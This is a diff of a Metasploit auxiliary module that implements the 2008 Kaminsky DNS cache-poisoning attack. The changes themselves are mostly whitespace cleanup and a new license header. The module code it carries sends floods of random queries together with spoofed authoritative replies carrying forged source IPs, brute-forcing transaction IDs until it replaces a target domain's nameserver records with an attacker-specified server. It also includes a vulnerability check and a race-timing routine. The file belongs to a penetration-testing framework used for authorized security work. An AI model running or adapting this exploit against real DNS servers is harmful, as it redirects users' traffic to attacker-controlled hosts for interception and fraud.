@@ -1,3 +1,14 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
 require 'msf/core'
 require 'net/dns'
 require 'racket'
@@ -9,23 +20,23 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Capture
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'DNS BailiWicked Domain Attack',
 			'Description'    => %q{
-				This exploit attacks a fairly ubiquitous flaw in DNS implementations which 
+				This exploit attacks a fairly ubiquitous flaw in DNS implementations which
 				Dan Kaminsky found and disclosed ~Jul 2008.  This exploit replaces the target
 				domains nameserver entries in a vulnerable DNS cache server. This attack works
 				by sending random hostname queries to the target DNS server coupled with spoofed
 				replies to those queries from the authoritative nameservers for that domain.
 				Eventually, a guessed ID will match, the spoofed packet will get accepted, and
 				the nameserver entries for the target domain will be replaced by the server
-				specified in the NEWDNS option of this exploit. 
+				specified in the NEWDNS option of this exploit.
 			},
-			'Author'         => 
-				[ 
+			'Author'         =>
+				[
 				'	I)ruid', 'hdm',
 					                                      #
-					'Cedric Blancher <sid[at]rstack.org>' # Cedric figured out the NS injection method 
+					'Cedric Blancher <sid[at]rstack.org>' # Cedric figured out the NS injection method
 					                                      # and was cool enough to email us and share!
 					                                      #
 				],
@@ -39,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Jul 21 2008'
 			))
-			
+
 			register_options(
 				[
 					OptEnum.new('SRCADDR', [true, 'The source address to use for sending the queries', 'Real', ['Real', 'Random'], 'Real']),
@@ -50,29 +61,29 @@ class Metasploit3 < Msf::Auxiliary
 					OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),
 					OptInt.new('TTL', [true, 'The TTL for the malicious host entry', rand(20000)+30000]),
 				], self.class)
-					
+
 			deregister_options('FILTER','PCAPFILE')
 	end
-	
+
 	def auxiliary_commands
-		return { 
+		return {
 			"check" => "Determine if the specified DNS server (RHOST) is vulnerable",
 			"racer" => "Determine the size of the window for the target server"
 		 }
 	end
-	
+
 	def cmd_racer(*args)
 		targ = args[0] || rhost()
 		dom  = args[1] || "example.com"
-		
+
 		if !(targ and targ.length > 0)
 			print_status("usage: racer [dns-server] [domain]")
 			return
 		end
-		
-		calculate_race(targ, dom)		
+
+		calculate_race(targ, dom)
 	end
-	
+
 	def cmd_check(*args)
 		targ = args[0] || rhost()
 		if !(targ and targ.length > 0)
@@ -84,20 +95,20 @@ class Metasploit3 < Msf::Auxiliary
 		srv_sock = Rex::Socket.create_udp(
 			'PeerHost' => targ,
 			'PeerPort' => 53
-		)		
+		)
 
 		random = false
 		ports  = {}
 		lport  = nil
 		reps   = 0
-		
+
 		1.upto(30) do |i|
-		
+
 			req = Resolv::DNS::Message.new
 			txt = "spoofprobe-check-#{i}-#{$$}#{(rand()*1000000).to_i}.red.metasploit.com"
 			req.add_question(txt, Resolv::DNS::Resource::IN::TXT)
 			req.rd = 1
-			
+
 			srv_sock.put(req.encode)
 			res, addr = srv_sock.recvfrom(65535, 1.0)
 
@@ -120,24 +131,24 @@ class Metasploit3 < Msf::Auxiliary
 					end
 				end
 			end
-			
-	
+
+
 			if(i>5 and ports.keys.length == 0)
 				break
-			end	
+			end
 		end
-		
+
 		srv_sock.close
-		
+
 		if(ports.keys.length == 0)
 			print_status("ERROR: This server is not replying to recursive requests")
 			return
 		end
-		
+
 		if(reps < 30)
 			print_status("WARNING: This server did not reply to all of our requests")
 		end
-		
+
 		if(random)
 			ports_u = ports.keys.length
 			ports_r = ((ports.keys.length/30.0)*100).to_i
@@ -149,7 +160,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("FAIL: This server uses a static source port and is vulnerable to poisoning")
 		end
 	end
-			
+
 	def run
 		target  = rhost()
 		source  = Rex::Socket.source_address(target)
@@ -161,7 +172,7 @@ class Metasploit3 < Msf::Auxiliary
 		xids    = datastore['XIDS'].to_i
 		newttl  = datastore['TTL'].to_i
 		xidbase = rand(20001) + 20000
-		numxids = xids		
+		numxids = xids
 		address = Rex::Text.rand_text(4).unpack("C4").join(".")
 
 		srv_sock = Rex::Socket.create_udp(
@@ -175,10 +186,10 @@ class Metasploit3 < Msf::Auxiliary
 			txt = "spoofprobe-#{$$}#{(rand()*1000000).to_i}.red.metasploit.com"
 			req.add_question(txt, Resolv::DNS::Resource::IN::TXT)
 			req.rd = 1
-			
+
 			srv_sock.put(req.encode)
 			res, addr = srv_sock.recvfrom()
-			
+
 			if res and res.length > 0
 				res = Resolv::DNS::Message.decode(res)
 				res.each_answer do |name, ttl, data|
@@ -219,7 +230,7 @@ class Metasploit3 < Msf::Auxiliary
 							return
 						end
 					end
-					
+
 				end
 			end until not cached
 		rescue ::Interrupt
@@ -247,7 +258,7 @@ class Metasploit3 < Msf::Auxiliary
 				#print_status " Got answer with #{answer1.header.anCount} answers, #{answer1.header.nsCount} authorities"
 				answer1.answer.each do |rr1|
 					print_status "   Got an #{rr1.type} record: #{rr1.inspect}"
-					res2 = Net::DNS::Resolver.new(:nameservers => rr1.address, :dns_search => false, :recursive => false, :retry => 1) 
+					res2 = Net::DNS::Resolver.new(:nameservers => rr1.address, :dns_search => false, :recursive => false, :retry => 1)
 					print_status "    Checking Authoritativeness: Querying #{rr1.address} for #{domain}..."
 					answer2 = res2.send(domain, Net::DNS::SOA)
 					if answer2 and answer2.header.auth? and answer2.header.anCount >= 1
@@ -256,7 +267,7 @@ class Metasploit3 < Msf::Auxiliary
 						print_status "    #{rr0.nsdname} is authoritative for #{domain}, adding to list of nameservers to spoof as"
 					end
 				end
-			end	
+			end
 		end
 
 		if barbs.length == 0
@@ -265,7 +276,7 @@ class Metasploit3 < Msf::Auxiliary
 			close_pcap
 			return
 		end
-		
+
 		if(xids == 0)
 			print_status("Calculating the number of spoofed replies to send per query...")
 			qcnt = calculate_race(target, domain, 100)
@@ -275,10 +286,10 @@ class Metasploit3 < Msf::Auxiliary
 				srv_sock.close
 				close_pcap
 				return
-			end			
+			end
 			print_status("Sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
 		end
-		
+
 		# Flood the target with queries and spoofed responses, one will eventually hit
 		queries = 0
 		responses = 0
@@ -298,11 +309,11 @@ class Metasploit3 < Msf::Auxiliary
 			req.rd = 1
 
 			src_ip = source
-			
+
 			if(saddr == 'Random')
 				src_ip = Rex::Text.rand_text(4).unpack("C4").join(".")
 			end
-			
+
 			n = Racket::Racket.new
 			n.l3 = Racket::L3::IPv4.new
 			n.l3.src_ip = src_ip
@@ -314,12 +325,12 @@ class Metasploit3 < Msf::Auxiliary
 			n.l4.src_port = (rand((2**16)-1024)+1024).to_i
 			n.l4.dst_port = 53
 			n.l4.payload  = req.encode
-			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)	
-			buff = n.pack			
+			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
+			buff = n.pack
 
 			capture_sendto(buff, target)
 			queries += 1
-			
+
 			# Send evil spoofed answer from ALL nameservers (barbs[*][:addr])
 			req.add_answer(randhost, newttl, Resolv::DNS::Resource::IN::A.new(address))
 			req.add_authority(domain, newttl, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(newdns)))
@@ -331,14 +342,14 @@ class Metasploit3 < Msf::Auxiliary
 			n.l4.src_port = 53
 			n.l4.dst_port = sport.to_i
 			n.l4.payload  = req.encode
-						
+
 			xidbase.upto(xidbase+numxids-1) do |id|
 				req.id = id
-				barbs.each do |barb|	
+				barbs.each do |barb|
 					n.l3.src_ip = barb[:addr].to_s
-					n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)	
+					n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
 					buff = n.pack
-						
+
 					capture_sendto(buff, target)
 					responses += 1
 				end
@@ -358,16 +369,16 @@ class Metasploit3 < Msf::Auxiliary
 						return
 					end
 					print_status("Now sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
-				end	
+				end
 			end
 
 			# every so often, check and see if the target is poisoned...
-			if queries % 250 == 0 
+			if queries % 250 == 0
 				begin
 					query = Resolv::DNS::Message.new
 					query.add_question(domain, Resolv::DNS::Resource::IN::NS)
 					query.rd = 0
-	
+
 					srv_sock.put(query.encode)
 					answer, addr = srv_sock.recvfrom()
 
@@ -397,8 +408,8 @@ class Metasploit3 < Msf::Auxiliary
 	# Send a recursive query to the target server, then flood
 	# the server with non-recursive queries for the same entry.
 	# Calculate how many non-recursive queries we receive back
-	# until the real server responds. This should give us a 
-	# ballpark figure for ns->ns latency. We can repeat this 
+	# until the real server responds. This should give us a
+	# ballpark figure for ns->ns latency. We can repeat this
 	# a few times to account for each nameserver the cache server
 	# may query for the target domain.
 	#
@@ -409,9 +420,9 @@ class Metasploit3 < Msf::Auxiliary
 		cnt     = 0
 
 		times   = []
-		
+
 		hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain
-				
+
 		sock = Rex::Socket.create_udp(
 			'PeerHost' => server,
 			'PeerPort' => 53
@@ -426,7 +437,7 @@ class Metasploit3 < Msf::Auxiliary
 		q_beg_t = Time.now.to_f
 		sock.put(req.encode)
 		req.rd = 0
-					
+
 		while(times.length < num)
 			res, addr = sock.recvfrom(65535, 0.01)
 
@@ -436,31 +447,31 @@ class Metasploit3 < Msf::Auxiliary
 				if(res.id == 1)
 					times << [Time.now.to_f - q_beg_t, cnt]
 					cnt = 0
-					
+
 					hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain
 
-					sock.close					
+					sock.close
 					sock = Rex::Socket.create_udp(
 						'PeerHost' => server,
 						'PeerPort' => 53
-					)		
-					
+					)
+
 					q_beg_t = Time.now.to_f
 					req = Resolv::DNS::Message.new
 					req.add_question(hostname, Resolv::DNS::Resource::IN::A)
 					req.rd = 1
 					req.id = 1
-					
+
 					sock.put(req.encode)
-					req.rd = 0	
+					req.rd = 0
 				end
-				
+
 				cnt += 1
 			end
-			
+
 			req.id += 1
-			
-			sock.put(req.encode)		
+
+			sock.put(req.encode)
 		end
 
 		min_time = (times.map{|i| i[0]}.min * 100).to_i / 100.0
@@ -468,20 +479,20 @@ class Metasploit3 < Msf::Auxiliary
 		sum       = 0
 		times.each{|i| sum += i[0]}
 		avg_time = (	(sum / times.length) * 100).to_i / 100.0
-		
+
 		min_count = times.map{|i| i[1]}.min
 		max_count = times.map{|i| i[1]}.max
 		sum       = 0
 		times.each{|i| sum += i[1]}
 		avg_count = sum / times.length
-				
+
 		sock.close
-		
+
 		print_status("  race calc: #{times.length} queries | min/max/avg time: #{min_time}/#{max_time}/#{avg_time} | min/max/avg replies: #{min_count}/#{max_count}/#{avg_count}")
 
 
 		# XXX: We should subtract the timing from the target to us (calculated based on 0.50 of our non-recursive query times)
 		avg_count
-	end	
-	
+	end
+
 end
